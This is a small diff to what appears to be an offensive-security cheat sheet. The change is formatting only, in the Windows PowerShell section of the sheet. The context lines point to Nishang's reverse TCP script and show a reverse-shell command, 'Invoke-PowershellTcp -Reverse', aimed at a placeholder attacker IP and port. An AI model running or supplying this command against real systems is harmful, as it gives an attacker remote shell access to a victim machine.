@@ -93,8 +93,9 @@ Simple PHP Command Injection
 
 Windows Powershell
 ------------------
-Nishang -PS reverse tcp
-Copy the .Example to the bottom of the script
+Nishang -PS reverse tcp.
+
+Copy the **.Example** to the bottom of the script
 
       Invoke-PowershellTcp -Reverse -IPAddress x.x.x.x -Port 1234
 
